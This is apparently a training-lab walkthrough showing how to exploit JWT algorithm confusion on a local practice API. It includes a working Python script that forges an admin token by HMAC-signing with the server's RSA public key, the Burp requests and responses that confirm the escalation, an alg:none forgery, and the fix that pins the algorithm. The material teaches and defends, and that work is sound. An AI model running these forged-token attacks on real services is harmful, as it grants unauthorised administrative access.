# Walkthrough — jwt-key-confusion

You are going to take the API's **public** key — published on purpose, anyone can download it — and use it to forge a `role: admin` token the server accepts as genuine. Not because the signature is broken (it matches, mathematically), not because the key is weak (it's a 2048-bit RSA key) — but because the server lets the **token** choose which algorithm to verify with. You say "verify this as HMAC," and the public key — harmless as a *verification* key under RSA — becomes the *signing* key under HMAC. Nothing is weak. And it still opens.

This atom **closes the JWT trilogy**:

- [`jwt-none-alg`](../jwt-none-alg/) — the lock didn't lock (`alg:none`, verification skipped).
- [`jwt-weak-secret`](../jwt-weak-secret/) — the lock locked, but the key was on a sticky note (weak HS256 secret).
- **Here** — the lock locks, the key is strong, the signature checks out, and it still opens.

It is the sibling of `jwt-none-alg` in the *shape of the bug and the fix* (both are the server trusting the token's `alg`), and the sibling of `jwt-weak-secret` in *impact* (vertical escalation to admin).

## 1. Context

A small API with RS256 JWT auth. Four endpoints:

- `POST /login` — returns an RS256 JWT carrying `{"sub": "alice", "role": "user"}`. No password.
- `GET /jwks` — the RSA **public** key, in PEM. Published so clients can verify tokens — and, here, the material you forge with.
- `GET /api/profile` — any valid token; echoes your claims. Your baseline, and where you capture the JWT.
- `GET /admin/users` — requires `role: admin`. Your `user` token gets `403`; a forged `admin` token gets `200`.

The server verifies RS256 tokens correctly, rejects a tampered signature with `401`, and rejects `alg:none` (the `jwt-none-alg` trick) with `401` too. This is **A02 — algorithm confusion (RS256 → HS256)**: the RSA and the HMAC are both sound; the one flaw is that the server reads the token's own `alg` field to decide *which* algorithm family to verify with.

The track is **Burp** (log in, capture the token, grab `/jwks`, replay the forgery) plus a **terminal** (forge the token). There is no browser: computing an HMAC over the public key is something Burp can't do, so — exactly as a browser executes JavaScript for a client-side bug — the tool that does that part of the job joins the primary track. The tokens below are from one real session; because these claims carry no timestamps and RSA PKCS#1 v1.5 is deterministic, logging in as `alice` gives you the same bytes.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `verify` helper opens exactly like `jwt-none-alg`'s did — it reads the token's own header and branches on `alg`:

```python
def verify(token):
    alg = jwt.get_unverified_header(token).get("alg")
    if alg == "HS256":
        header_b64, payload_b64, sig_b64 = token.split(".")
        signing_input = f"{header_b64}.{payload_b64}".encode()
        expected = hmac.new(PUBLIC_KEY_PEM, signing_input, hashlib.sha256).digest()
        if not hmac.compare_digest(expected, _b64url_decode(sig_b64)):
            raise ValueError("bad HS256 signature")
        return json.loads(_b64url_decode(payload_b64))
    if alg == "RS256":
        return jwt.decode(token, PUBLIC_KEY_PEM, algorithms=["RS256"])
    raise ValueError("unsupported alg")
```

Two branches, one key. The `RS256` branch is correct: it RSA-verifies with the public key, which is exactly what a public key is *for*. The `HS256` branch HMAC-verifies with **the same `PUBLIC_KEY_PEM`** — using the public key as a shared secret. And that key is *public*: it's served at `/jwks`.

The audit question isn't "does it verify?" — it does, correctly, in both branches. It's **"who chooses which branch runs?"** The answer is the token, in its own `alg` header — a value the attacker writes. That is the whole bug. Hold it for the diff: the fix will *stop asking the token* and pin `algorithms=["RS256"]` — the same move `jwt-none-alg` made.

(Why is the HS256 branch hand-rolled with `hmac` instead of PyJWT? Because modern PyJWT *refuses* to do it — see §6. Real key-confusion bugs live in exactly this kind of hand-written verification.)

## 3. RS256 vs HS256 — why the same key means two different things

The whole attack rides on the difference between the two algorithms:

- **RS256 is asymmetric.** The private key signs; the public key verifies. Knowing how to *verify* (the public key) tells you nothing about how to *sign* (the private key). That asymmetry is exactly why it's safe to publish the public key — a holder can only *check* tokens, not *mint* them.
- **HS256 is symmetric.** One key both signs and verifies. To verify is to sign: whoever can check an HMAC can also produce one.

Now collapse them. When the server is tricked into treating the RSA **public** key as an **HMAC secret**, the asymmetry is gone: the key that was only ever meant to *verify* becomes the key that *signs*. And the attacker has that key — it's public. Same bytes, two algorithms, two completely different meanings of security: harmless under RS256, catastrophic under HS256. (For a byte-by-byte anatomy of a JWT, see `jwt-none-alg`'s walkthrough §2 — this atom won't repeat the whole primer.)

## 4. Baseline — the API working (Repeater)

Point Burp at `127.0.0.1:8014` and work from Repeater. Log in as alice:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8014
Content-Type: application/json

{"user": "alice"}
```

Response — `200`, an **RS256** token (note `"alg":"RS256"` in the decoded header):

```json
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJ1c2VyIn0.tnNgD5Cwy4GGgWVYGaQT2gQJe5E8hL5njH0GRKmq6C2XskbmiBFt5LjxvjcwH4a9G--zrG_fcF3RoTaxe56kSkfyiVl2iottnIEv2XZB2fufqF196PRMqcMeShj4_vinY2JZah4s9Xn8jHz4fWn8I3BzKzVr85gqj1sCDs2xFVTYKc6Ca-Hxh2yFhmtvx_pgeyAX6vlr1bxpUqKgegjjexRDADlOLxjzmAKrRpz_pY82qZj0vhStZwKB_A94eCNlTFKxsVdViQsNZeaTBwcpPnOhbgF7mXchbQZIue6hEmRIzz-HXpLM3B83WAkf4EK0mOau95NT618C12hww23cPA"}
```

Decoded, the header and payload are:

```
header  {"alg":"RS256","typ":"JWT"}
payload {"sub":"alice","role":"user"}
```

Confirm the token works, then try the admin endpoint with it (paste the full token from the login response in place of the truncated one):

```
GET /api/profile HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...C12hww23cPA
```

`200` — `{"role":"user","sub":"alice"}`. Same token against `/admin/users`:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...C12hww23cPA
```

`403`. You are authenticated, but `role` is `user`. That's the legitimate baseline: the role gate works.

## 5. Step 1 — Grab the public key (`GET /jwks`)

This is honest recon — the key is *meant* to be public. Request it and save the exact response body:

```
GET /jwks HTTP/1.1
Host: 127.0.0.1:8014
```

Response — `200`, `Content-Type: application/x-pem-file`:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzbh9iGjria8A/I3yzjOj
G9zeWOTFNF/VUWzr4R28JAN+xJRkQlUFYNMoOxh+8t08u1L5Ab27gJxVj10e3Fzw
wYdqzPGA3KE1cqMMiJYfo9PMveCLt+6ofx5LiNunLz0oD/kImZS4orsM1Mt1mJ1C
NSStoUhsENdbzWfEHPsceEyPQyq0UJZyR0OEFo/mvbD4X8x2tTbuSFVyKJftDPok
t5kvGa/KkuJYg+A8Fe+rdok7So57swsnkh64LQ2HG8GFCuiVesfCnK9XRAplqRrU
uu7ynveXwu1vQtX6TS/PwT56Ug+UA6CvU3uB97ZU1v0LGyeQq5JlI1daUTKjN8/o
pQIDAQAB
-----END PUBLIC KEY-----
```

Save those exact bytes to a file — `jwks.pem`. In Burp: copy the response body verbatim. From the terminal:

```bash
curl -s http://127.0.0.1:8014/jwks -o jwks.pem
```

Nothing here breaks a secret. You downloaded a public value, the way the server intends. The point is what comes next: the server will accept that public value as if it were a private signing key.

## 6. Step 2 — Forge the token (terminal)

You now build an `alg:HS256` token with `role: admin` and sign it with an HMAC keyed on **the exact bytes of the public key** you just saved. This mirrors the server's HS256 branch precisely — same key, same algorithm, same encoding:

```python
import base64, hmac, hashlib

# The EXACT bytes served by GET /jwks (save the response body to jwks.pem).
pub = open("jwks.pem", "rb").read()

def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=")

header = b64url(b'{"alg":"HS256","typ":"JWT"}')
payload = b64url(b'{"sub":"alice","role":"admin"}')
signing_input = header + b"." + payload
sig = b64url(hmac.new(pub, signing_input, hashlib.sha256).digest())
print((signing_input + b"." + sig).decode())
```

Run it. It prints your forged admin token:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

Decoded, the payload now reads `{"sub":"alice","role":"admin"}`.

**Why hand-rolled, and not a one-liner like `jwt-weak-secret`?** In that atom the forge was `jwt.encode({...}, secret, algorithm="HS256")` — PyJWT happily takes a string as an HMAC secret. Here the "secret" is an RSA public key, and PyJWT **refuses**:

```
jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509
certificate and should not be used as an HMAC secret.
```

That refusal is the modern-library guard against exactly this attack — and it is the same guard the vulnerable server bypassed by hand-rolling its HMAC. So the attacker hand-rolls too (stdlib `hmac`), or reaches for a tool that does. **jwt_tool** ([ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)) has a dedicated key-confusion exploit mode (`-X k`, fed the public key) that automates exactly this; the explicit script above is shown so you can see precisely which key, which encoding, which algorithm — the "same bytes" lesson in the open.

## 7. Step 3 — Replay the forged token (Burp)

Back in Repeater, send the forged token to the admin endpoint:

```
GET /admin/users HTTP/1.1
Host: 127.0.0.1:8014
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

Response — `200`, the admin-only data:

```json
[{"role":"user","user":"alice"},{"role":"user","user":"bob"},{"role":"admin","user":"carol"}]
```

Vertical escalation confirmed. You didn't break RSA and you didn't break HMAC — you made the server **verify with the wrong key**, by letting the token pick the algorithm. The server computed `HMAC-SHA256(header.payload, PUBLIC_KEY_PEM)`, got exactly the bytes you computed with the same public key, and called it a valid signature.

## 8. What the vuln is NOT

The exploit can push you toward the wrong conclusion. Kill four of them — all from Repeater.

**It is not broken cryptography.** RSA is intact, HMAC-SHA256 is intact, the key is a full 2048-bit RSA key. A legitimate RS256 token still verifies; a tampered one is rejected. Nothing was broken mathematically — you used a *public* value in a way the server should never have allowed.

**It is not a weak key (this is not `jwt-weak-secret`).** There is nothing to brute-force. You didn't guess anything; you *downloaded* the key from `/jwks`, because it's public. Making the key stronger changes nothing — the flaw is that it's accepted under the wrong algorithm.

**It is not `alg:none` (this is not `jwt-none-alg`).** Send the classic unsigned forgery:

```
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.
```

`401` — the server handles only `HS256` and `RS256`; anything else falls through and is rejected. But note the *kinship*: `jwt-none-alg` and this atom are the same disease — the server trusting the token's `alg`. There the token said "don't verify"; here it says "verify with this family." Same trust, different symptom.

**It is purely the alg-controlled branch.** The surgical proof: take your forged token and change only the header's `alg` from `HS256` to `RS256`, keeping the same HMAC signature:

```
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhbGljZSIsInJvbGUiOiJhZG1pbiJ9.LUEAPnztfFAk0dJU8BJBVUGPEDyf8VcaUx98QigGUE0
```

- forged, `alg:HS256` → `200`
- same signature, header `alg` flipped to `RS256` → `401` (the RS256 branch RSA-verifies the HMAC bytes as an RSA signature, and fails)

The only thing that changed is which branch the server chose to run — and that choice is the token's to make. That is the entire vulnerability.

The trilogy, made concrete:

| | `jwt-none-alg` | `jwt-weak-secret` | `jwt-key-confusion` (here) |
|---|---|---|---|
| The lock | didn't lock (`alg:none`) | locks; key on a sticky note | locks; key is strong; signature checks out |
| What's weak | the verification (skipped) | the secret's value | **nothing** |
| The attack | **strip** the signature | **re-make** it with the cracked key | **re-make** it with the *public* key as HMAC secret |
| Root cause | trusts the token's `alg` | the secret has no entropy | trusts the token's `alg` |

The left and right columns share a root cause — *trusting the token's `alg`* — which is why `jwt-none-alg` and this atom also share a fix.

## 9. Impact

Vertical privilege escalation. With the public key — which is *public* — you can forge **any** token: any `sub`, any `role`, any claim the app trusts. You didn't read another same-level user's data (that's the horizontal escalation the IDOR/BOLA atoms teach); you *became an administrator*, and could become anyone. In effect you own the app's authentication. **It is not RCE** — no code execution — but for an auth system it is close to total.

What makes this the climax of the trilogy is not a bigger impact — it's the same vertical escalation as `jwt-weak-secret`. It's that **nothing is weak**: a strong key, a signature that genuinely verifies, sound algorithms — and it still falls, on a single line of misplaced trust.

## 10. Why the fix works

Run the chain against the fixed API on port **8114** (see [`DIFF.md`](./DIFF.md)). It is byte-identical except for the `verify` helper, which now pins the algorithm instead of reading it from the token:

```python
def verify(token):
    return jwt.decode(token, PUBLIC_KEY_PEM, algorithms=["RS256"])
```

- **Replay your forged `alg:HS256` token** → `401`. PyJWT ignores the token's `alg` claim and enforces the allowlist; `HS256` isn't in it, so the token is rejected before any HMAC is computed. The public key is now only ever a *verification* key — never an HMAC secret.
- **A legitimate RS256 token** still gets `200` on `/api/profile` and `403` on `/admin/users` — the role gate is intact.
- Everything else is unchanged: same keypair, same endpoints, same `/jwks`.

This is the **same fix shape as `jwt-none-alg`**: both stop branching on `header["alg"]` and pin a positive `algorithms=` allowlist, letting the library impose it. `jwt-none-alg`'s rule holds unchanged here — *the server decides which algorithms it accepts, before it reads the token; whatever the token claims about its own algorithm is a hint, not a directive.* The header is data, not policy. See [`DIFF.md`](./DIFF.md) for why the vulnerable server verified by hand in the first place.
